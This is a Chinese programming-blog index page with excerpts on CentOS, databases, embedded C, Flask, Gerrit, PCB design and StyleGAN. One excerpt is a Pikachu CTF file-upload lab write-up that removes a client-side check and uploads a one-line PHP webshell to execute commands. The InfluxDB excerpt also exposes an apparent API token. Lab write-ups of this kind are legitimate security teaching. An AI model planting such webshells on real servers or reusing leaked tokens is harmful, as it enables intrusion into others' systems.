CentOS-7-x86_64-NetInstall-1708.iso 网络安装镜像(从网络安装或者救援系统) CentOS-7-x86_64-Everything-1708.iso 对完整版安装盘的软件进行补充，集成所有软件。(包含centos7的一套完整的软件包，可以用来安装系统或者填充本地镜像)
CentOS-7-x86_64-LiveGNOME-1708.iso GNOME桌面版 CentOS-7-x86_64-LiveKDE-1708.iso KDE桌面版 CentOS-7-x86_64-Minimal-1708.iso 精简版，自带的软件最少
如何安装配置lamp可以参考：https://help.aliyun.com/document_detail/50774.html?spm=a2c4g.11174283.6.781.578152feOuFtfn
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/4f5b7f437a39ab4031af119bcceb7d86/" rel="bookmark">
			influxdb 命令行执行查询语句
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		 控制面板不太会用，还想用SQL语句做一些查询。
官方说明：influx config create | InfluxDB Cloud (TSM) Documentation
influx config create -a -n test1Cfg -o yfgg -u http://192.168.1.123:8086/ -t 0FYkCSl4ERw7upUHoHy9UwDzEm_X3lgQNSL9ntZsif2kIE-024nY2A6VVP0jha8QNNQy_UJe53e9WtV4mkMGzQ== # 进入shell influx v1 shell 不创建连接会报未授权的错误。 
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/ab63cb4540b4bf5872972fa7aa21851b/" rel="bookmark">
			ajax和vue实现前后端数据传递
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		在我的上一篇文章：
前言 学生信息管理系统
详细描述了一个web项目的增删改查操作怎么去实现，在前端页面中我们定义form表单，输入text文本信息，再提交表单，数据信息便会传入表单的action指定的资源路径中（servlet层中），再通过req.getParameter(" name")方法获取url中指定的属性值。
接下来我详细记录一下如何使用ajax和vue来实现数据的传递与接收
一，ajax+vue展示所有用户 1.1 创建数据库smbms以及用户表smbms_user /* Navicat Premium Data Transfer Source Server : localhost_3306 Source Server Type : MySQL Source Server Version : 80028 Source Host : localhost:3306 Source Schema : smbms Target Server Type : MySQL Target Server Version : 80028 File Encoding : 65001 Date: 06/04/2023 21:14:48 */ SET NAMES utf8mb4; SET FOREIGN_KEY_CHECKS = 0; -- ---------------------------- -- Table structure for smbms_user -- ---------------------------- DROP TABLE IF EXISTS `smbms_user`; CREATE TABLE `smbms_user` ( `id` bigint(0) NOT NULL AUTO_INCREMENT COMMENT '主键ID', `userCode` varchar(15) CHARACTER SET utf8 COLLATE utf8_unicode_ci NULL DEFAULT NULL COMMENT '用户编码', `userName` varchar(15) CHARACTER SET utf8 COLLATE utf8_unicode_ci NULL DEFAULT NULL COMMENT '用户名称', `userPassword` varchar(15) CHARACTER SET utf8 COLLATE utf8_unicode_ci NULL DEFAULT NULL COMMENT '用户密码', `gender` int(0) NULL DEFAULT NULL COMMENT '性别（1:女、 2:男）', PRIMARY KEY (`id`) USING BTREE ) ENGINE = InnoDB AUTO_INCREMENT = 112 CHARACTER SET = utf8 COLLATE = utf8_unicode_ci ROW_FORMAT = Dynamic; -- ---------------------------- -- Records of smbms_user -- ---------------------------- INSERT INTO `smbms_user` VALUES (2, 'admin', '管理员', '123456', 0); INSERT INTO `smbms_user` VALUES (5, 'hanlubiao', '韩路彪', '0000000', 0); INSERT INTO `smbms_user` VALUES (6, 'zhanghua', '张华', '0000000', 1); INSERT INTO `smbms_user` VALUES (7, 'wangyang', '王洋', '123', 0); INSERT INTO `smbms_user` VALUES (8, 'zhaoyan', '赵燕', '0000000', 1); INSERT INTO `smbms_user` VALUES (10, 'sunlei', '孙磊', '0000000', 0); INSERT INTO `smbms_user` VALUES (12, 'zhangchen', '张晨', '0000000', 1); INSERT INTO `smbms_user` VALUES (13, 'dengchao', '邓超', '0000000', 0); INSERT INTO `smbms_user` VALUES (14, 'yangguo', '杨过', '0000000', 0); SET FOREIGN_KEY_CHECKS = 1; INSERT INTO `smbms_user`(`id`, `userCode`, `userName`, `userPassword`, `gender`) VALUES (2, 'admin', '管理员', '123456', 0); INSERT INTO `smbms_user`(`id`, `userCode`, `userName`, `userPassword`, `gender`) VALUES (5, 'hanlubiao', '韩路彪', '0000000', 0); INSERT INTO `smbms_user`(`id`, `userCode`, `userName`, `userPassword`, `gender`) VALUES (6, 'zhanghua', '张华', '0000000', 1); INSERT INTO `smbms_user`(`id`, `userCode`, `userName`, `userPassword`, `gender`) VALUES (7, 'wangyang', '王洋', '123', 0); INSERT INTO `smbms_user`(`id`, `userCode`, `userName`, `userPassword`, `gender`) VALUES (8, 'zhaoyan', '赵燕', '0000000', 1); INSERT INTO `smbms_user`(`id`, `userCode`, `userName`, `userPassword`, `gender`) VALUES (10, 'sunlei', '孙磊', '0000000', 0); INSERT INTO `smbms_user`(`id`, `userCode`, `userName`, `userPassword`, `gender`) VALUES (12, 'zhangchen', '张晨', '0000000', 1); INSERT INTO `smbms_user`(`id`, `userCode`, `userName`, `userPassword`, `gender`) VALUES (13, 'dengchao', '邓超', '0000000', 0); INSERT INTO `smbms_user`(`id`, `userCode`, `userName`, `userPassword`, `gender`) VALUES (14, 'yangguo', '杨过', '0000000', 0); 1.
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/ab63cb4540b4bf5872972fa7aa21851b/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/33b3db44fdca090337a8cbe861af8e8e/" rel="bookmark">
			python批量添加经纬度照片水印，照片水印，坐标转换
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		通过获取shp文件的大地2000坐标，然后转换为经纬度坐标，最后将经纬度坐标添加到照片中，实现照片添加水印，实现批量添加经纬度坐标水印。
-- coding: utf-8 -- import cv2, random
import cv2, os, sys
from PIL import ImageFont, ImageDraw, Image
import numpy as np
import shutil
from pyproj import CRS
from pyproj import Transformer
import time
import random
from osgeo import ogr
import os, sys, glob
import sys, traceback
from PyQt5.QtWidgets import QApplication, QMainWindow, QFileDialog, QAction
from PyQt5 import QtCore, QtGui, QtWidgets
from PyQt5.QtWidgets import QMessageBox
list_cmsj = {}
def yes(zm, cm, wd, jd):
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/33b3db44fdca090337a8cbe861af8e8e/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/954275efad19f9da6edbf80cff66541c/" rel="bookmark">
			【web-ctf】ctf-pikachu-fileupload
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		文章目录 File Upload（文件上传漏洞）1. client check2. MIME type3. getimagesize 总结 File Upload（文件上传漏洞） 漏洞产生原因：用户上传文件时，在后台并没有对上传的文件功能进行安全考虑或者采用了有缺陷的措施，导致攻击者可以通过一些手段来绕过安全措施从而上传一些恶意文件（如：一句话木马），从而通过该恶意文件的访问来控制整个web后台。
文件上传漏洞测试流程：
对文件上传的地方按照要求上传文件，查看返回结果（路径，提示等）尝试上传把不同类型的 “恶意” 文件，比如xx.php文件，分析结果查看html源码，看是否通过js在前端做了上传限制，可以绕过尝试使用不同方式进行绕过：黑白名单绕过/MIME类型绕过/目录0x00截断绕过等猜测或者结合其他漏洞（比如敏感信息泄露等）得到木马路径，连接测试。 1. client check 随意上传一个文件。
最好是上传一个网页不允许的文件类型，这样可以看出是如何对上传文件进行限制的。这里上传了一个php文件。
网页弹窗提示文件不符合要求，因此文件上传的限制有可能是在前端。
因此我们打开网页控制台，并找到按钮的html代码。
然后发现上传按钮中存在一个函数checkFileExt，我们打开网页源代码，分析该函数的作用。
发现该函数就是限制上传文件的后缀名的一个函数，如果满足后缀名为jpg、png、gif的文件可以上传，不满足则弹窗。
修改网页前端代码，将该限制去除。
上传一个一句话木马文件system.php
文件内容：
&lt;?php system($_GET['x']);?&gt; 文件上传成功，并且返回了该一句话木马文件的路径。
更改浏览器的url，给x传参，即可进行攻击。
2. MIME type MIME介绍：MIME（Multipurpose Internet Mail Extensions）多用途互联网邮件扩展类型。是设定某种扩展名的文件用一种应用程序来打开的方式类型，当该扩展名文件被访问的时候，浏览器会自动使用指定应用程序来打开。多用于指定一些客户端自定义的文件名，以及一些媒体文件打开方式。
具体介绍：MIME详解
MIME 类型通用结构：
type/subtype MIME 的组成结构非常简单，由类型与子类型两个字符串中间用 / 分隔而组成，不允许有空格。type 表示可以被分多个子类的独立类别，subtype 表示细分后的每个类型。
例如：
超文本标记语言文本 .html、.html：text/html
普通文本 .txt： text/plain
RTF 文本 .rtf： application/rtf
GIF 图形 .gif： image/gif
JPEG 图形 .jpeg、.jpg： image/jpeg
au 声音文件 .
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/954275efad19f9da6edbf80cff66541c/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/1ee6b32af57214c108d8371da6c02346/" rel="bookmark">
			mac mongodb 安装及配置
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		1.官网下载地址：MongoDB: The Developer Data Platform | MongoDB
2.下载好压缩包，解压后放在想放的地方，例如：
/Users/xiaokeai/environment/mongodb-macos-x86_64-5.0.18
3.打开终端后，在家目录中打开.bash_profile，注意有.这是个隐藏文件，在打开的文本中输入
export PATH=${PATH}:/Users/xiaokeai/environment/mongodb-macos-x86_64-5.0.18/bin，
一定要引用到bin文件
cd //切换到家目录
open .bash_profile //打开环境变量配置
在打开的文件中添加：export PATH=${PATH}:/Users/xiaokeai/environment/mongodb-macos-x86_64-5.0.18/bin
source .bash_profile //保存环境变量
4.cd /Users/xiaokeai/environment/mongodb-macos-x86_64-5.0.18/bin
输入：mongod -version
出现
说明配置成功
注：此处没有配置全局环境变量，在其他目录下使用 mongod -version 可能会出现mongod: command not found
5.在/Users/xiaokeai/environment/mongodb-macos-x86_64-5.0.18/ 目录下创建两个文件，一个配置类文件
文件夹一个存放数据库，
文件夹一个存放日志,
配置文件
打开终端
可以选择可视化文件创建，也可以使用命令行
命令行创建文件：
cd /Users/xiaokeai/environment/mongodb-macos-x86_64-5.0.18/
mkdir data //存放数据库
mkdir logs //存放日志
touch mongo.conf //存放配置文件
创建二级目录
cd /Users/xiaokeai/environment/mongodb-macos-x86_64-5.0.18/data
mkdir db
cd /Users/xiaokeai/environment/mongodb-macos-x86_64-5.0.18/logs
touch mongodb.log
6.配置文件的修改：注意路径
#数据库路径
dbpath=/Users/xiaokeai/environment/mongodb-macos-x86_64-5.0.18/data/db
#日志输出文件路径
logpath=/Users/xiaokeai/environment/mongodb-macos-x86_64-5.0.18/logs/mongodb.log
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/1ee6b32af57214c108d8371da6c02346/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/193d2c229f005ce648a77f12d017df7e/" rel="bookmark">
			error: use of undeclared identifier ‘PBout‘
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		 STM32单片机新手入门常见BUG之一 问题点：
error: use of undeclared identifier ‘PBout’
【BUG背景】
使用位操作，点亮LED灯
如下图所示，报错信息：error: use of undeclared identifier ‘PBout’
（单词翻译：undeclared：未声明的，idenfitier: 标识符）
【BUG原因】
经过查找发现BUG原因来自led.h文件中的宏定义，如下图所示，将LED0映射到PBout(5)上。
BUG原因：“()”是中文格式的
#define LED0 PBout （5） 【解决过程】
把中文格式的“()”改为英文格式的“()”，修改后BUG得到解决。
#define LED0 PBout(5) 所以新手敲代码时，一定要注意中英文的格式区别，养成每次输入前检查输入法，输入后检查内容的良好习惯！ 走向财富自由，从输入法开始!^_^^_^ 
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/953a17980d4be1a24126c807cc160eab/" rel="bookmark">
			Pinctrl子系统_01_Pinctrl子系统介绍
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		本节介绍在Pinctrl子系统中，将会学习哪些内容。
Pinctrl作用 Pinctrl：Pin Controller，顾名思义，就是用来控制引脚的。
一个芯片有成百上千个引脚，这些引用要怎么配置，配置成什么功能，都是通Pinctrl子系统来实现的。
如下图所示，对于一个芯片，有很多个控制器，比如GPIO控制器，I2C控制器，UART控制器，这些控制器都需要操作到引脚。但是不同的控制器，他们需要的引脚配置通常也不同。
要如何实现不同引脚的配置的，就可以使用Pinctrl子系统来配置。
Pinctrl有三大功能：
引脚的枚举与命名（Enumerating and naming）
枚举：列出芯片有哪些引脚
命名：各个引脚的名字叫什么引脚复用（Multiplexing）：比如用作GPIO、I2C或其他功能引脚配置（Configuration）：比如上拉、下拉、open drain、驱动强度等 实际上，在芯片内部并没有一个硬件Pinctrl——引脚控制器，但引脚控制器也并不完全是一个软件上的东西，他的背后是有硬件支持的。
首先，引脚控制器是有对应驱动的，芯片引脚控制器的驱动代码，通常是由芯片原厂提供的，是由原厂的BSP工程师编写的，一般的驱动工程师只需要使用就可以了。
通常是在设备树中使用：
指明使用哪些引脚指明复用为哪些功能配置为哪些状态 在一般的设备驱动程序中，甚至可以没有Pinctrl的代码。
后续内容 简单的说，后续需要掌握的内容如下：
Pinctrl驱动程序如何编写，里面的重要结构体是怎么样的分析如何在设备树中使用Pinctrl驱动程序和设备树中的配置是如何联系到一起的，设备树中的配置是如何生效的，很明显内核会帮忙我们调用对应Pinctrl子系统中的代码，我们需要知道是如何实现的，要去分析这个过程 那么，要如何学习这些内容：
基于使用的角度驱动工程师要掌握的Pinctrl重要概念Pinctrl子系统使用示例 主要数据结构与调试方法
pincontroller的数据结构构造过程情景分析(会拆分为很多节)
根据开发板的设备树信息动态地演示
client端的数据结构构造过程情景分析(会拆分为很多节)
根据开发板的设备树信息动态地演示
编写一个虚拟的pincontroller驱动程序
其中，1-2主要是说明如何使用（use）Pinctrl子系统；
3-4主要是说明Pinctrl子系统的实现，先说明主要的数据结构，然后根据实际的开发板来动态的演示，跟踪数据结构的构造过程，我们理解这了些数据结构怎么构成，对这个部分的实现也就基本了解了；
5主要是看看设备树中的信息，怎么和Pinctrl子系统产生联系，我们需要来分析这个过程，这个过程同样会设涉及一些数据结构，类似的，我们理解这了些数据结构怎么构成，对这个部分的实现也就基本了解了；
6主要是编写一个虚拟的pincontroller驱动程序，用来加深我们的理解。
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/4661fc212688692048a4fa823b59461d/" rel="bookmark">
			Flask 5000 端口被占用
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		 以ubuntu为例
1.在终端下输入
sudo lsof -i:5000 查找出所有使用5000端口
2.使用以下指令关闭所有占用端口
sudo kill &lt;PID&gt; 其中&lt;PID&gt;:是使用5000端口应用的程序。
注意：在工程文件中不建议使用该方法，这样会杀死所有正在使用的端口。
同理在docker部署过程中，如果端口被占用，比如 5432 端口以及被使用 一定是之前测试过程中使用到了 5432，一直没有被释放。
方法1：停止该容器，再次创建
docker stop &lt;数据库容器ID&gt; 方法2：
sudo lsof -i:5432 # 显示所有 5432 的 sudo -9 &lt;PID&gt;# 杀死所以 5432 在使用的进程 
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/9769d2aa20617fb0203c3a0c9c3fc2a3/" rel="bookmark">
			文章综合导航
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		 文章综合导航 说明AndroidAndroid UI移动架构性能优化NDKFFMPEG数据结构与算法其他杂项 C语言C语言基础深入理解C语言 C++语言JavaPython数据结构与算法读书笔记开源框架源代码分析学习日常ShellAndroid StudioAndroid源码LinuxWindows 说明 很久没写文章了，上次还是好几年前。这两天突然想起在 CSDN 还有个账号，于是上来看看，发现之前，虽然是很久以前了，还是写了不少文章的。但整体要找起来还是不太容易，于是决定把之前的文章做下整理。整个导航文章出来。
Android Android UI RecyclerView简单使用RecyclerView间隔线添加RecyclerView头部和尾部添加RecyclerView拖拽和侧滑DrawerLayout侧滑NavigationView侧滑Snackbar符合MD的常用控件PaletteTableLayout沉浸式设计CardViewFloatingActionButton自定义Behavior属性动画MD动画SVG自定义动画框架事件传递自定义控件画笔Paint高级渲染滤镜和颜色通道画板CanvasPath和PathMeasureUI绘制流程 移动架构 UML简单工厂模式原型模式单例模式建造者模式责任链模式命令模式解释器模式模板模式观察者模式状态模式策略模式迭代器模式代理模式六大设计原则AOP面向切面编程面向对象式数据库框架设计网络访问框架设计数据库分库和全版本升级图片加载框架设计json解析框架IOC架构设计手写ButterKnife框架MVP框架MVVM框架 性能优化 内存泄漏内存分析工具的使用(整理)内存泄露常见例子渲染机制及优化电量优化屏幕常亮与CPU唤醒Bitmap内存管理及优化图片压缩性能优化数据传输效率优化多线程优化热修复Service进程防杀 NDK C语言JNI开发流程JNI数据类型和属性方法的访问JNI的引用JNI的异常处理与缓存策略NDK开发流程文件的拆分与合并增量更新使用现有so动态库多线程与生产消费模式gdb调试JNI多线程 FFMPEG 初识ffmpegffmpeg在VS下的运用Linux下编译Android动态库Native原生绘制音频解码音频播放编译脚本多线程音视频解码 数据结构与算法 Android中的数据结构Android中的算法 其他杂项 Android SDK目录说明Android 反编译技术流程优化apk的odex处理AndroidMainfest详解Android基础知识（一）默认电话研究 C语言 C语言基础 预备知识第一个C语言程序数据类型小程序字符串的格式化输出和输入运算符流程控制数组字符串函数多源文件的编译指针内存管理结构体联合体枚举typedef文件操作结构体与二进制文件增删改查基础数据结构与算法makefilegccgdb字符串处理函数 深入理解C语言 深入理解void深入理解指针指针使用的常见错误接口封装设计思想深入理解内存四区二级指针三种内存模型深入理解数组结构体做函数参数函数指针 C++语言 C++与C语言的一些区别C++对C语言的扩充和增强namespaceconst引用C++对C语言的函数拓展构造函数和析构函数用程序理解浅拷贝new与deletestatic面向对象模型探究运算符重载封装继承继承中的构造与析构多态多态的实现原理模板STL异常处理 Java Java概述和环境配置基础语法流程控制数组函数面向对象继承抽象类与接口多态内部类异常包,classpath,import,jar多线程设计模式String类包装类Lambda表达式枚举类对象与垃圾回收集合泛型Java中的常用类IOGUI网络编程反射机制正则表达式 Python 搭建编程环境变量和简单数据类型列表和元组流程控制字典 数据结构与算法 概念线性表stackqueue树排序 读书笔记 《Android开发艺术探索》读书笔记-Android的生命周期和启动模式 开源框架源代码分析 热门开源项目源代码分析导航OkHttp从使用到源代码分析(1)-官方说明OkHttp从使用到源代码分析(2)-请求的使用方法OkHttp从使用到源代码分析(3)-使用三步走中的源码分析OkHttp从使用到源代码分析(4)-Dispatcher任务调度 学习日常 Android-Makefilejson解析xml解析java基础类库Red Hat Enterprise 6.5 在虚拟机上将系统语言修改为中文 Shell 变量,字符串,数组,注释,参数传递运算符流程控制常用命令，重定向和文件包含 Android Studio Android Studio优化编译速度APK在Android Studio下如何签名 Android源码 Android_7.1.1_r6源码下载Android_7.1.1_r6源码编译Android核心程序之SystemUI - （一）开篇源码分析之AsyncTask源码分析之Handler Linux Linux基础Linux配置文件的修改so的封装和使用 Windows dll的封装和使用dll注入windows下的句柄利用 
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/fa0bd25a10311d94a4754d03ff22cd3b/" rel="bookmark">
			记录jsp中引用js的bug
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		jsp中如果出现点击一次但是连着触发了好几次js代码情况的话，可能是这个原因导致的。
原先：
&lt;script src="xxx.js"&gt;&lt;/script&gt;
修改后：
&lt;script type="text/javascript" src="xxx.js"&gt;&lt;/script&gt; 这样的话就不会出现点击一次连着触发好几次js代码的bug了。
还有一个可能是jsp嵌套着好几层jsp，然后父层jsp和子层jsp都引用相同的js文件，也有概率出现这个bug
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/cada3aade57ffff99bbf602d4bf34d1d/" rel="bookmark">
			使用git提交代码到gerrit
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		 系统 Linux
需要安装 git
第一步
cd ~ mkdir learn_git cd learn_git // 注意，下面的用户名和邮箱和gerrit网站的账号一定要相同 git config --global user.name "用户名" git config --global user.email "邮箱地址" ssh-keygen 之后一路回车 cat ~/.ssh/id_rsa.pub 之后会出现密钥 复制密钥，把密钥添加进Gerrit。 cd ~/learn_git git clone "ssh://你自己的用户名@newbies.thundersoft.com:29419/zip" &amp;&amp; scp -p -P 29419 iu077@newbies.thundersoft.com:hooks/commit-msg "zip/.git/hooks/" cd zip 在zip文件夹里创建自己的文件 git add --all git commit -m "提交的日志信息，随便输入就可以" git push origin HEAD:refs/for/dev 看到这个绿色的success就算成功。 
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/4cbfbfa0f47ce506634ba36446892518/" rel="bookmark">
			python接口基础
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		一、什么是API接口 接口的定义 接口：应用程序接口，简称API。
是数据交互的入口和出口，是一套规范，一套标准。
接口本质上是程序开发的函数和方法，提供参数和返回值。
接口的分类 软件接口：作用是适配，后端（服务器） 前端（界面）
硬件接口：作用是适配，常见的硬件接口：USB接口，type c接口，lighting接口
访问接口的介质 介质：URL（统一资源定位符（Uniform Resource Locator），也被称为web地址。）
比如：http://www.baidu.com
二、什么是接口测试 接口测试的定义 测试接口的返回数据是否和预期一致。可以使用浏览器、postman、jmeter和soupui等接口测试工具，也可以通过代码访问。
接口定义规则 可以在接口文档查看
访问地址
请求方式
请求参数
三、HTTP协议 HTTP是一种应用层协议，用于在客户端和服务器之间传输超文本（Hypertext）数据。
HTTP 协议通过请求和响应的方式进行数据交互，客户端向服务器发送请求，服务器接收到请求后进行处理，返回响应给客户端。
HTTP （Hypertext Transfer Protocol，超文本传输协议）由三部分组成：
请求报文（Request Message）：客户端向服务器发送的请求消息，包括请求行、请求头部和请求正文三部分组成。
响应报文（Response Message）：服务器向客户端返回的响应消息，包括状态行、响应头部和响应正文三部分组成。
连接管理：用于建立和管理客户端与服务器之间的连接，包括 TCP 连接管理和 HTTP 持久连接等。
HTTP请求 HTTP 请求由三个部分组成：请求行、请求头和请求体。
请求行 请求行包含了请求方法、请求 URL 和 HTTP 版本信息，其基本格式如下：
&lt;Method&gt; &lt;URL&gt; HTTP/&lt;Version&gt; &lt;Method&gt; 表示请求方法，例如 GET、POST、PUT、DELETE 等
GER
请求指定的资源， 使用GET的请求应该只用于获取数据
POST
发送数据给服务器，创建或者更新资源
PUT
创建或者替换目标资源
PATCH
用于对资源进行部分修改
DELETE
删除资源
补充：GET和POST的区别
区别
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/4cbfbfa0f47ce506634ba36446892518/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/b5132afe0f0de0fbc53b73ffdc8d103a/" rel="bookmark">
			AD绘制PCB板框&#43;定位孔（Altium Designer）
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		PCB板框+定位孔 一、绘制PCB板框的操作步骤二、放置定位孔的操作步骤三、定位孔的绘制步骤 一、绘制PCB板框的操作步骤 举例：40cm×60cm板框画法
步骤1：打开PCB画图界面，快捷键E+O+S 设置坐标原点；
步骤2：根据坐标原点位置，画4条板框线，4条板框线X、Y位置的设置如下；
第1条板框线
第2条板框线
第3条板框线
第4条板框线
画出板框
步骤3：根据板框，4个转角的位置上放置倒角；
步骤4：快捷键P+D+L，板框的X、Y测量尺寸设置如下；
X 测量尺寸 （横向）
Y 测量尺寸 （纵向）
步骤5：快捷键D+S+D，重新规划板面积。
二、放置定位孔的操作步骤 举例：板框4个角分别放置定位孔
步骤1：画好板框后，4个定位孔放置板框内部；
步骤2：4个定位孔X、Y位置的设置如下；
左上角定位孔
左下角定位孔
右上角定位孔
右下角定位孔
定位孔放置的效果图
步骤3：快捷键P+D+L，分别测量4个定位孔的位置。
三、定位孔的绘制步骤 举例：以M3定位孔为例（可安装M3螺丝或铜柱）
步骤1：按照上述步骤确定PCB板框后，再按下图，选择Mechanical1层→ 放置 →圆；
步骤2：在Mechanical1层绘制任意圆，双击圆，弹出Properties，设置线条宽度0.127mm，半径1.75mm，网络选择"No Net"；
步骤3：选择TOP Overlay层，重复步骤1，再画一个圆，双击TOP Overlay层的圆，弹出Properties，设置线条宽度0.127mm，半径3.5mm，网络选择"No Net，location设置X、Y坐标与Machanical1层的圆心坐标一致（即大圆和小圆的圆心坐标相同）；
步骤4：选择Machanical1层的圆（小圆），快捷键T+V+B，实现PCB挖槽，效果如下图；
步骤5：选择TOP Overlay层的圆（大圆），快捷键T+V+T，实现不规则图形禁止铺铜，铺铜后效果如下图（先区域铺铜再重新铺铜），定位孔绘制完成。
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/1df7148b884a9afd79be4e186b930fbb/" rel="bookmark">
			如何用Python进行屏幕录制？
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		文章目录 引言gpt3.5给出的代码更换截图函数——ImageGrab.grab禁用imshow解决递归现象摄像头录制代码后期需求 引言 关于屏幕录制这个功能需求，之前用过基于ffmpeg的Capture录屏软件，但是fps拉高以后会变得很卡，声音也同样出现卡顿。也自己尝试过在python中调用ffmpeg的库函数，效果也不尽人意。网络上下载了几款录屏软件，不是要收费就是下载到捆绑软件或广告很是心累，因此想借此机会重新研究一下屏幕录制软件的工作原理，同时当作一个小项目练手。
gpt3.5给出的代码 当我还在犹豫是否要精心翻阅一下ffmpeg的说明书时，没想到gpt已果断给出了参考答案，可以使用Python的PyAutoGUI库来实现录屏功能。以下是一个简单的示例代码：
import pyautogui import cv2 import numpy as np # 获取屏幕分辨率 screen_size = (1920, 1080) # 设置视频编码器 fourcc = cv2.VideoWriter_fourcc(*"XVID") # 创建视频写入对象 out = cv2.VideoWriter("output.avi", fourcc, 20.0, screen_size) # 开始录屏 while True: # 获取屏幕截图 img = pyautogui.screenshot() # 将截图转换为OpenCV格式 frame = np.array(img) frame = cv2.cvtColor(frame, cv2.COLOR_BGR2RGB) # 写入视频 out.write(frame) # 按下q键退出录屏 if cv2.waitKey(1) == ord("q"): break # 释放资源 out.release() cv2.destroyAllWindows() 从给出的代码看来，屏幕录制的工作原理就是以一定的帧率不断地截图，然后将截取的图片以相同的帧率合成一个视频。
放在安装了pyautogui的python环境里运行后，果然不出意外的话就要出意外了。gpt3.5给出的代码卡在运行中的界面纹丝不动，按’q’回车也并未退出循环，再问gpt也死活给不出修改方案。
查阅资料后发现要先imshow()之后，在ui窗口区域内按键才能有效终止循环：
import numpy as np import pyautogui import cv2 # 设置录制参数 SCREEN_SIZE = (1920, 1080) FILENAME = 'recorded_video.
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/1df7148b884a9afd79be4e186b930fbb/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/707b78dc057e2a4e563161237e598c17/" rel="bookmark">
			（2019, StyleGAN）用于 GAN 的基于样式的生成器架构
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		A Style-Based Generator Architecture for Generative Adversarial Networks
公众号：EDPJ
目录
0. 摘要
1. 简介
2. 基于风格的生成器
2.1 生成图像的质量
2.2 现有技术
3. 基于样式的生成器的属性
3.1 风格混合
3.2 随机变化
3.3 将全局效应与随机性分开
4. 解耦研究
4.1 感知路径长度
4.2 线性可分性
5. 结论
参考
S. 总结
S.1 核心思想
S.2 分析
S.3 其他贡献
0. 摘要 我们为生成对抗网络提出了一种替代生成器架构，借鉴了风格迁移。 新架构实现了高级属性（例如，在人脸上训练时的姿势和身份）和生成图像的随机变化（例如，雀斑、头发）的自动学习、无监督分离，并且可以直观地、特定规模地控制合成。 新的生成器在传统分布质量指标方面改进了最新技术，导致明显更好的插值特性，并且也更好地解耦了隐空间的变化因素。 为了量化插值质量和解耦，我们提出了两种适用于任何生成器架构的新的自动化方法。 最后，我们介绍了一个新的、高度多样化和高质量的人脸数据集。
1. 简介 受风格迁移的启发，我们重新设计了生成器架构，以展示控制图像合成过程的新方法。 我们的生成器从学习到的常量输入开始，根据隐编码调整每个卷积层的图像“风格”，从而直接控制不同尺度下图像特征的强度。 我们不以任何方式修改鉴别器或损失函数，因此我们的工作与正在进行的关于 GAN 损失函数、正则化和超参数的讨论是正交的。
我们的生成器将输入的隐编码嵌入到中间隐空间中，这对网络中变异因素的表示方式有着深远的影响。 输入隐空间必须遵循训练数据的概率密度，我们认为这会导致某种程度的不可避免的耦合。 我们的中间隐空间不受该限制，因此可以解耦。 由于以前估计隐空间解耦度的方法不能直接适用于我们的案例，我们提出了两个新的自动化指标——感知路径长度和线性可分性——来量化生成器的这些方面。 使用这些指标，我们表明，与传统的生成器架构相比，我们的生成器允许对不同的变化因素进行更线性、更少耦合的表示。
最后，我们展示了一个新的人脸数据集（Flickr-Faces-HQ，FFHQ），它提供了比现有的高分辨率数据集（附录 A）更高的质量和更广泛的变化。我们已公开提供此数据集以及我们的源代码和预训练网络。可以在同一链接下找到随附的视频。
